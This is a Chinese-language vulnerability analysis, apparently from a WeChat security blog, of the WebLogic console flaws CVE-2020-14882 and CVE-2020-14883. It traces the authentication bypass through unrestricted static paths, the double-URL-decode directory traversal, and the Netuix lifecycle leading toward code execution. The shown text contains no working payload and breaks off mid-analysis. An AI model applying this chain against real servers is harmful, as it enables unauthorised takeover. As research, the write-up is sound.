> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yIiK7br7ZCaH1DsPGnTFHw)

![](https://mmbiz.qpic.cn/mmbiz_gif/GfOvuXUmaIichKN4fuyBV856xHdsnuRTeChfYItiaiaP6C5QQibXh56dmwWiaMFia2yE01nib45cPuiaib6kMd5OT95aeeA/640?wx_fmt=gif)  

**这个漏洞想要挖掘出来真的挺难的，其利用的过程相当精彩，值得学习。**

**0x01 漏洞概述**
=============

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFk0HQqkF6vDFbWTkYuswgvIwFB9iaw8sfg5KXia3DXYj7RUIp2ZTWIQ2Q/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFfttwh7kmvTfzbtMRvgIvARX9hHmCWIORXTG61HI6ySs21WOWrXk47A/640?wx_fmt=jpeg)

Weblogic 官方在 10 月补丁中修复了`CVE-2020-14882`及`CVE-2020-14883`两个漏洞，这两个漏洞都位于`Weblogic Console`及控制台组件中，两个漏洞组合利用允许远程攻击者通过`http`进行网络请求，从而攻击 Weblogic 服务器，最终远程攻击者可以利用该漏洞在未授权的情况下完全接管 Weblogic 服务器。

在经过 diff 后，可以定位到漏洞触发点：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFdD7j6pcLd7gYROYg6yAjOqUubdwWEAPwqQoicKrVnCMnxGvTfZayA4g/640?wx_fmt=jpeg)

```
CVE-2020-14883:com.bea.console.handles.HandleFactory
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFicKrNSSayeIj7eXtVicvUWJNm8OGJcS5ewVcfTOVra68FOZt7J6TW6eQ/640?wx_fmt=jpeg)  

```
CVE-2020-14882:com.bea.console.utils.MBeanUtilsInitSingleFileServlet
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFmjUC0s6opibTQVqS3CzgBJMJj1dohia8g5v8qrSPy49kz7Ds1n2AYz5w/640?wx_fmt=jpeg)  

这里先把结论放出来：

*   CVE-2020-14882：这个漏洞起到的作用可以简单理解为目录穿越使`Netuix`渲染后台页面
    
*   CVE-2020-14883：为登录后的一处代码执行点
    

**0x02 漏洞分析**
=============

该漏洞分为三部分：

*   路由鉴权
    
*   Netuix 框架完成执行流转换
    
*   HandleFactory 完成代码执行
    

前两部分为`CVE-2020-14882`，后面一部分为`CVE-2020-14883`。本文将从上而下将三部分进行串流分析，主要采用动态跟踪。

2.1 路由鉴权
--------

在具体分析路由鉴权前，需要先要寻找一下处理路由的 servlet 是哪个。

### 2.1.1 寻找处理路由的 servlet

Weblogic`console`组件对应着 Weblogic Server 启动后的管理平台（即`/console`路由所对应的组件），其对应着一个`webapp`，

所以想要理清路由所对应的`servlet`映射关系，就需要去看一下相关的配置文件。配置文件为`wlserver/server/lib/consoleapp/webapp/WEB-INF/web.xml`。

正常登录后的路由情况为：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFCs5uNCTafZ5yYTvGcHFfwUuX4LrNwvmNIYBA5s992TauZZ6LrxKUicA/640?wx_fmt=jpeg)

会访问一个`console.portal`文件，对应在`web.xml`中看一下相关的路由处理情况：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFCWkVtkQQ70wp0eDyWXA7oibsLn1F4ghoxBTW1p5AV1vGctSWEJXLvjQ/640?wx_fmt=jpeg)

可以看到对应的`servlet`为`AppManagerServlet`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFfqBTWicrN33RjiaKjayA4X1pWiczRIHzmLVYnQuQQ7lBw1lMd1axbOp1A/640?wx_fmt=jpeg)

所以先在`AppManagerServlet`下断调试一下路径鉴权或者说是权限鉴定的流程。

跟进一下初始化流程：

```
weblogic.servlet.AsyncInitServlet#init ->
weblogic.servlet.AsyncInitServlet#initDelegate ->
weblogic.servlet.AsyncInitServlet#createDelegate
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFFQpR5gHpOicXCY5VsLIsEEqxpJ5qXA26YASlWY4bcmZWlS60B6ibWjbw/640?wx_fmt=jpeg)  

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFnd99OQxpMwTdP8tv4SE0x64KcTRjTibvn8ZD6zgnbSydlEQlyWnVVpw/640?wx_fmt=jpeg)

这里的`this.SERVLET_CLASS_NAME`也就是 xml 中的：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGF9JrephkyBDtQ7UQQwkfdl9I2Kycex2Rx9vgzK3PClpUVaHuQWpLyCg/640?wx_fmt=jpeg)

所以初始化过程实际上是实例化了`com.bea.console.utils.MBeanUtilsInitSingleFileServlet`，并调用其`init()`方法，跟进看一下其所对应的处理方法：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFPuCFhvDvwq7LbPMRicO1fFpXpVpRygR9Qnv1TZic4XX3WH2D9q6zNl6w/640?wx_fmt=jpeg)

注意红框所标识的内容，oracle 针对`CVE-2020-14882`的修补也是在这里针对`url`加了一个黑名单，并过了一遍黑名单：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFETdNh89h1v39bhX6DyrOLJwh5K5SrqiaUgUiafSUNqoqgjn5L3I46s7w/640?wx_fmt=jpeg)

继续跟进父类`SingleFileServlet`的`server`中：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFcbuEIXCcAO2YCcicLbHVoR1umtzyaicjqoDOsYLaHuPa6s32krQ7JF1w/640?wx_fmt=jpeg)

在完成`AppContext`初始化后，即进入真的处理请求的`UIServlet`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGF2CPoHOJfAQUqibESs5ZAVHV6BcicIeFZ5ENvWibtF3Tnbtc3tib4pAFcmQ/640?wx_fmt=jpeg)

在此处完成后续的请求处理。

### 2.1.2 路由映射及路由权限校验

在这里我们先不向后跟进，在此处下个断点向上跟踪一下，看一下 Weblogic 路由映射及路由鉴权在哪里触发。调用栈如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFALr82HzTTQJwktKtJzrregdXk4qxpuiaqibGkB5QuTS1LOR5Dh2B8Dbw/640?wx_fmt=jpeg)

可以看到在`weblogic.servlet.internal.WebAppServletContext`中完成的权限校验。跟进具体看一下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFxiaTY6cnGx807g5e4PIgjc9luhesmGWoT4VpSMsC51xRBH0n745HiaOw/640?wx_fmt=jpeg)

在`weblogic.servlet.internal.WebAppServletContext#doSecuredExecute`方法的流程中会调用`checkAccess`方法来进行权限校验，跟进看一下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFzqYK1fxlUVgSgEClOt50EMJA9PLAlia625cYDPicAlrpm71cBMJZ2DPA/640?wx_fmt=jpeg)

当首次请求进入后`checkAllResources`变量为`false`，所以跟进`getConstraint`方法：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFPZ7fLILkAueVPAdiczLqhQRhYY7mIRl6nIqheuhZy2ut2oPxqB9TA2A/640?wx_fmt=jpeg)

这里的`constraintsMap`中保存着一份路由表：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGF2esIq25kH9RuTMxuOUqsw6UibBIFshlP9cyUW1w6yD3ficgwNeEC58rw/640?wx_fmt=jpeg)

这份路由表对应的是`web.xml`中的`security-constraint`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFibUqeK3cm28vn6Mb4M2XibRKuShz57fiaukib8DuGuHLO0cicZAoZfoKaNg/640?wx_fmt=jpeg)

注意在针对`/`的路由处理是限定了需要经过认证的，而针对：

*   `/images/*`
    
*   `/common/*`
    
*   `/css/*`
    

路径的访问是没有认证约束的。对应到代码中，就是说当访问的路由符合该路由映射表中的情况时，将根据配置设置`rcForAllMethods`变量，也就是最终返回的`resourceConstraint`:

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFKtkiaK5icFpgKwVvh5ASvhvADkbC1NMbIhagfsN7bRrTR4PvQibxH6lMQ/640?wx_fmt=jpeg)

这里的`unrestricted`变量代表该路由是否为非受限路由，在后续鉴权时该变量会起关键性作用。当请求的路由是路由表中的路由时，该变量都为`true`。当完成`resourceConstraint`设置后，就会进入`isAuthorized`方法进行权限鉴定：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFtqnw5iaugvaSyq8FhFpP9Fwo4ciauzibeK8suMk0bQqZ4dFia1FJpoMd4Q/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFmIhMqC7DdGB6hRiapHgROfic86tl585ASYGpCLHAZecicic5G0hqggfdxQ/640?wx_fmt=jpeg)

这里将执行流转换到`CertSecurityModule#checkUserPerm`方法中：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGF0pS6LNgymt8Jt0WA414aph5Ohia5ibw7bohHojibBLDsHHBmspGdtiadIg/640?wx_fmt=jpeg)

首先会根据`session`来确定是否需要重新登录，之后会判断是否为指定路由，如果是未指定的路由，则保护资源，由于我们这里访问的路由为`/css`，在指定的路由表中，所以这里是`false`。重点看`hasPermission`方法，这里会用到`resourceConstraint`中的`unrestricted`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFSlMFOyytNwDeuRQVXUQO6Hycj4ibqto3mOic0Pq2VicmsYQmPumFozzkQ/640?wx_fmt=jpeg)

这里首先会判断当前的账户是否为 Admin 账户，当前应用是否为内部引用等，若都不满足，则会判断是否设置了`完整安全路由`选项，这里是`false`。接下来会判断该路由是否为非受限的路由，如果是，则返回 true。由于我们根据路由表返回设置的`unrestricted`变量为`true`，即为非受限的路由，所以这样就通过了路由鉴权，导致了未授权访问相关资源。

### 2.1.3 请求分派

当完成了路由鉴权后，会根据`web.xml`中的设置，将访问的路由映射到相应的 servlet 进行请求处理：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFRYibbrzMmegEASzRAkZLjiaS0uqlZTZpS7krn9F1br5Mjq6omDsoHX8w/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFIkOiauJMz9gCiaCauKdntqEibBT18qd00U0k35oRW3483qIpicobB864icA/640?wx_fmt=jpeg)

因为我们后续的流程在`UIServlet`中进行，所以可以用于绕过路由鉴权的路由即为：

*   `/css/*`
    
*   `/images/*`
    

当`checkAccess`方法返回为`true`后，会根据配置返回对应的 servlet 并调用`service`方法。

首先会初始化`ServletInvocationAction`对象：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGF3qQNVLnSetYKygKDAgjL2f80Ah6UbKxEAFjU9QUtWhRG9UtU1TibLSA/640?wx_fmt=jpeg)

从`subject.run(action)`一路向下跟，在`weblogic.security.acl.internal.AuthenticatedSubject#doAs`中调用`action`的`run`方法，即跟进`ServletInvocationAction#run`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFGraArokazB2qCWPTscepZl2yjSNIictABunZV1Rqo4gHEwWyld6c8Ag/640?wx_fmt=jpeg)

在调用`execute`方法前，会首先判断是否存在拦截器及请求监听器，若存在则执行对应的拦截器执行链，否则执行`stub.execute()`方法。跟进`stub.execute()`方法，即`weblogic.servlet.internal.ServletStubImpl#execute`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFnPHTStERalELekgp9XnibC9uFK6ZRrR7G35RxicbZltiaHicEalaRxVic5A/640?wx_fmt=jpeg)

这里会调用`getServlet()`方法返回对应的`servlet`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFrMrv7IIWqEia5Pm2FmU5lia1h1diaLvMBDLvB0EGEcZvGQXGJo57Kr4qQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFsrnjljgtpx1naC3lBn3k1hqyZf4dAkGd5H52lLUhNpAPu8dLnc8pQQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFnIib1ictAwqtuUc3wBpTfPsFf6HGmGECkXMf6DdgxvlaWgCN4b720A7g/640?wx_fmt=jpeg)

### 2.1.3 总结

从上面的分析可知，想要访问非受限的资源，就需要构造符合路由表中的路由。从此我们也可以看出这里并非一个权限绕过操作，而是一个正常的访问非受限资源（如 css 文件这类资源）的操作，想要搞清楚为什么能因此而触发一个登陆后代码执行操作，就需要跟进`UIServlet`的具体处理流程中。

2.2 Netuix 框架完成执行流转换
--------------------

`weblogic.servlet.AsyncInitServlet`为处理`Netuix`相关请求的`servlet`，根据 2.1.1 中的分析，我们可以知道其真实的处理逻辑是在`com.bea.netuix.servlets.manager.UIServlet`中完成的：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFlmhAdnUUC2PFvCSCyQrTz0FBap7TJk9BicedBuM1m2d67qqqAO4nb4A/640?wx_fmt=jpeg)

对于`UIServlet`来说，处理 GET 请求的逻辑最终也会在`doPost`方法中。上图红框中所标明的两处即为`UIServlet`的核心功能：

*   建立`UIContext`，或者说是通过解析`.portal`文件建立渲染模板的上下文
    
*   完成模板渲染的生命周期
    

接下来也会以这两点为核心具体叙述 Netuix 框架是如何完成执行流的转换的。

### 2.2.1 建立 UIContext

建立`UIContext`的主要流程在`createUIContext`方法中：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFz2JyenTAOX97fN5icXLSCEkXyOarksbDwplwFaHnA4ORgj4CqR0mueA/640?wx_fmt=jpeg)

红框所标注的两行为关键流程。首先跟进`UIContextFactory.createUIContext`，这里主要完成了`UIContext`的初始化：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFXPxCh83yIk7I8bibqgBUpdL546rr05icIEE38QXypHE111eeGZeSAcqQ/640?wx_fmt=jpeg)

在执行`setServletRequest`方法时，会根据请求的参数对`postback`成员变量进行设置：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFHj7zH69BHr21fQVd4m57zjke0yhr2GIBwGOjRu1iaQVWeZTJUuicCe5g/640?wx_fmt=jpeg)

可以看到：

*   请求类型为 POST 请求，会将`postback`设置为`true`
    
*   存在`_nfpb`参数的 GET 请求，会根据参数的值设置`postback`的值
    

**`postback`变量在后续执行`UIContext`生命周期时会对流程产生影响**。这里先记一下。

完成`UIContext`的初始化过程后，接下来就是解析`.portal`文件，将解析结果填充到`UIContext`中。这一部分的流程在`getTree()`方法中：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFSxFGQf5XWO3skGliaxhtbhDPxGolwSmfNg7ekwTYGrafrvtSGXx474g/640?wx_fmt=jpeg)

这里有一个需要注意的点，这里会对请求的路径进行二次 URLDecode，这也就是为什么构造的 poc 是需要二次 URL 编码的原因。

跟进`processStream()`方法，具体的解析逻辑就在这里：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFPIDKnZzwWrjgtib4UL7oiaaXCz1SReYJtIbP84icDpP9iaIg3ylXsw6PzA/640?wx_fmt=jpeg)

可以看到经过二次 URLDecode 后的请求路径在此造成了**目录穿越**的效果。

`com.bea.netuix.servlets.manager.SingleFileProcessor#getMergedControlFromFile`中首先会初始化 SAX 解析器，然后根据传入的文件路径获取到对应的`.portal`文件，并利用 SAX 解析器解析该`.portal`文件：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGF1RMw45z0uSEVYriccTeib124ZaQ9vdZicCW44F8BibUuWS23E1DBYdjVKg/640?wx_fmt=jpeg)

`getMergedControlFromFile()`方法最终会调用`getSourceFromDisk()`方法根据传入的路径获取`consoleapp/webapp`目录下相应的文件即：

*   console.portal
    
*   consolejndi.portal
    

在利用 SAX 解析器解析完该`portal`文件后，生成语法树，也就是`getTree()`返回的`ControlTreeRoot`对象，并将语法树置入`UIContext`中。

至此就完成了`UIContext`的初始化流程。

### 2.2.2 完成模板渲染的生命周期

在完成了`UIContext`初始化流程之后，便会调用`runLifecycle()`方法运行生命周期，开始根据请求参数完成模板渲染。

跟进`runLifecycle()`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFvca4cnI40d3CKBWibILIoDN57M7IBO83Zb7Gj4SrrawB85dUehBibRZw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFQDOYVMPBaH0jknuXia0zVUIzBkR1GsxLYbBEQbQ27XVw0ab5U4ufkWQ/640?wx_fmt=jpeg)

在`com.bea.netuix.nf.Lifecycle#run`中，需要注意这个条件判断，这里会影响到后面的流程调用。

根据 2.2.1 中的分析我们知道当 GET 请求存在`_nfpb`参数时，会根据参数的值设置`postback`的值，`outbound`值默认为`false`。

而`postback`值只会影响是否会执行`runInbound()`流程。在具体跟踪了`runInbound()`流程后，可以发现其处理逻辑是相同的：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFZq0X3xQnY9W4OELUicwNmtY00BJWiaKNYsP2pI1LibJIbMVLh5bOm1gVA/640?wx_fmt=jpeg)

而关键点就在其`VisitorType`是不同的，这会在`processLifecycles()`流程中影响具体的节点遍历顺序：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFx1yQdZHSsuTQ7kVakibLpxricxQRo2nEMSd0MkLoeRNcq3MJOQxfZGqQ/640?wx_fmt=jpeg)

在`com.bea.netuix.nf.Lifecycle`中，我们可以看到`inbound`与`outbound`的区别：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGF9rMMeic3LW9D2lp9wPEb0eCDnBcR7B1nZ7WCiawK48Vpd7IgbEuFB15A/640?wx_fmt=jpeg)

各`VisitorType`具体配置为：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFURE903r5jw7CiawicgwdatCclpGYIj82EHerIwFQqI7v5q4rZRV8gQkA/640?wx_fmt=jpeg)

所以由`postback`会衍生出两种不同的执行流。

### 2.2.3 Netuix 生命周期及控件间的关系

在具体跟进两种执行流前，首先介绍一下`Netuix`的解析流程，在其官方介绍页面上有对生命周期方法执行顺序及 netuix 控件解析流程的详细描述，这里将其内容简要总结一下。

`Netuix`控件树的生命周期其实就是按顺序所执行的一组方法，这组方法的执行顺序如下：

```
init()
loadState()
handlePostbackData()
raiseChangeEvents()
preRender() 
saveState()
render()  
dispose()
```

其中的方法与上面所看到的`inbound`与`outbound`相同。这些方法在节点间是以深度优先的方式执行，即按照顺序会执行所有控件的`init()`，之后才会重新遍历执行`loadState()`方法。  

在说完了每个控件的生命周期后，再来说一下控件间的关系：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFF1ddOzLPS3kTgTnQB9SfRy8XnFC2icCBQYSjHeUUrE0kee3sSWTP8rQ/640?wx_fmt=jpeg)

根据这张表我们来对应看一下`consolejndi.portal`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFcL5ru5WWjgzcf3u6G1zN1rOgoX9zCbDSFKaYA0jp3Xqjviak7oMRk1A/640?wx_fmt=jpeg)

红框所标注的区域是完美符合上表所描述的关系的。向上寻找`Portlet`，看加载了哪些外部控件：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFmXXSZWdUHJZvBMmmibhyefbPqtIfbNsjHSt6fnNRSWodpvtJQaicFH3Q/640?wx_fmt=jpeg)

跟进该文件：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFF4whJhtDffydvk6tml2yDrUOBmG76kxAFrut3VeWmCKPrf6dSDk13g/640?wx_fmt=jpeg)

这里调用了`strutsContent`控件，同时标注了具体的`action`为`MessagesAction`。可以通过该`action`在`struts-config.xml`中找到其所对应的类：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFQe7KMnXwCVTz7abiaUEnREQxERAjickBGcydc2p5fTKnVdmRobiadyXkg/640?wx_fmt=jpeg)

### 2.2.4 总结

通过上面的分析，可以看到`Netuix`将执行流从模板渲染转换到其各个组件的渲染之中。所以最终触发代码执行的只和组件的生命周期有关，即只和节点有关。

在经过分析后，我列举三个最通用的组件：

*   `strutsConent`
    
*   `Page`
    
*   `Portlet`
    

由于无论`postback`为何值，最终都会执行`outbound`流程，所以接下来对于组件生命周期的分析，我都以`outbound`流程来说明。

2.3 条条大路通罗马——HandleFactory 完成代码执行
---------------------------------

根据上面的分析，`outbound`的生命周期为：

```
preRender() 
saveState()
render()
```

所以首先执行的方法是`preRender`，跟进看一下`com.bea.netuix.nf.ControlTreeWalker#walk`：  

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFpXdPWaMv39ypuyrwgba0nicoRUS7W3M0hqA3rLCibFk174y5ABxALKYw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFN79iciawWTC4QT8w9rZl5CswRw33OdsbB8WLEiaeEQ4TzYqaDNoM1JLJA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFcyE7ZBjGb2KxXy4ZwHXyB5aagwQDo7v47KISLbnVU1HHe5nicSSmUKw/640?wx_fmt=jpeg)

`ControlVisitor visit = root.getVisitorForLifecycle(vt);`这里将获取`ControlLifecycle.preRenderVisitor`以深度优先的方式遍历所有节点，并调用`visit()`方法。跟进看一下`com.bea.netuix.nf.ControlVisitor#visit`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFDJbZzGsyficYLL2IBgibOHIFyzS4HdEjuwcMrgPiaBuJZKN5eiadMNJrlA/640?wx_fmt=jpeg)

就如上面所说，关键逻辑还是调用传入控件的`preRender()`方法。接下来就会按照 2.2.3 中的所介绍的控件间关系进行深度遍历，在遍历到不同组件时会利用不同的方式触发代码执行流程。

### 2.3.1 strutsContent

以`consolejndi.portal`为例，当节点为`portletInstance`时，会触发外部组件调用，及会跟进该文件，解析`Content`节点：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFiaX6pBYe00x44mp3rKr792GkEoED9gP05kL6xnccXyUeiapsB4gxZzEg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFyXPoAVBQ58bQvtTebQNLxYDOcks1UDhWrpsiacgoziaRTTTIiaQicNPvibQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFZs9G1ia43PBvPhab0uRBkkpNpdo0mYHuD9aefiavuOeGEtqfuWlWX64Q/640?wx_fmt=jpeg)

此处处理的节点为`strutsContent`，即`control`为`strutsContent`。跟进`com.bea.netuix.servlets.controls.content.StrutsContent#preRender`方法：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFG9MTY4P1qRTPrdnRiaEmSylwvNxBiboqDC7vsMJibIfTIXNUSSEmYaaAg/640?wx_fmt=jpeg)

没有相关的方法，跟进其父类`com.bea.netuix.servlets.controls.content.NetuiContent#preRender`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGF6MsjqYicCc5llO5bCnqD38mYRib4ruNoicu5r9ufIcklobib5rPyRSvic7Q/640?wx_fmt=jpeg)

`this.getScopedContentStub()`调用栈如下：

```
com.bea.netuix.servlets.controls.content.StrutsContent#getScopedContentStub ->
com.bea.netuix.servlets.controls.content.StrutsContent.StrutsContentUrlRewriter初始化 ->
com.bea.portlet.adapter.scopedcontent.AdapterFactory#getInstance(com.bea.struts.adapter.util.rewriter.StrutsURLRewriter)
```

最终通过适配工厂返回一个`StrutsStubImpl`：  

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFX9x5Qy7FrVyYxNmCmeeONAfj8m2Da4ibDkW5Xp166ulRa917wIV80fA/640?wx_fmt=jpeg)

所以跟进`com.bea.portlet.adapter.scopedcontent.StrutsStubImpl#render`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFsV4O0eIS6ib9wNqLx33p3gibuicglS7xy0RbWg7e3XE1micjGR6EnUDeoQ/640?wx_fmt=jpeg)

在`renderInternal()`方法中，完成内部渲染的工作，包括：

*   初始化`Action`及其 servlet，并设置解析器，最终调用`executeAction`执行
    
*   初始化并设置请求监听器，完成请求接收
    

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFlYW8wwAWYRJ9A2pgC5CqujJNbwfbK6X9cWHQaRaQkaPcwiaepHWeE4Q/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFdLOCk26crvGKBmVJeInOjTuQRkQUnnHNBdQibEW2aydyc6dj5PphhGQ/640?wx_fmt=jpeg)

跟进`executeAction()`方法：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFG64AV6bqicEOd9mNEV6UJP8qqnxePOMgTxnjrnZT79SRup0uYd9ZRew/640?wx_fmt=jpeg)

这里会调用`PageFlowUtils#strutsLookup`方法，该方法最终将会触发`负责处理针对`Action`请求的servlet的doGet方法`，调用链如下：

```
com.bea.portlet.adapter.scopedcontent.framework.PageFlowUtils#strutsLookup
    com.bea.portlet.adapter.scopedcontent.framework.PageFlowUtils#getInstance
    com.bea.portlet.adapter.scopedcontent.framework.PageFlowUtils#instantiateStrutsDelegate
com.bea.portlet.adapter.scopedcontent.framework.internal.PageFlowUtilsBeehiveDelegate#strutsLookupInternal
org.apache.beehive.netui.pageflow.PageFlowUtils#strutsLookup(javax.servlet.ServletContext, javax.servlet.ServletRequest, javax.servlet.http.HttpServletResponse, java.lang.String, java.lang.String[])
org.apache.beehive.netui.pageflow.PageFlowUtils#strutsLookup(javax.servlet.ServletContext, javax.servlet.ServletRequest, javax.servlet.http.HttpServletResponse, java.lang.String, java.lang.String[], boolean)
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFVvRdX6HNrhX0AtCYlibHNTH3tFKuVR2ianBeGRErrJ1XmJvFnq3zUxfA/640?wx_fmt=jpeg)  

这里有两个点需要注意，第一个点是获取`ActionServlet`的过程，这一部分其实并不需要去跟踪代码，可以通过直接看`web.xml`找到：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGF6WQqhM89xQsMYfKqJvekpGDEoucQxhAjjvGSXCZ8efDh20bPC0BorA/640?wx_fmt=jpeg)

关于`AsyncInitServlet`的初始化流程在 2.1.1 中有详细的跟踪，这里就不赘述了。这里可以看出真正的处理逻辑在`com.bea.console.internal.ConsoleActionServlet`中，直接跟进看`com.bea.console.internal.ConsoleActionServlet#doGet`:

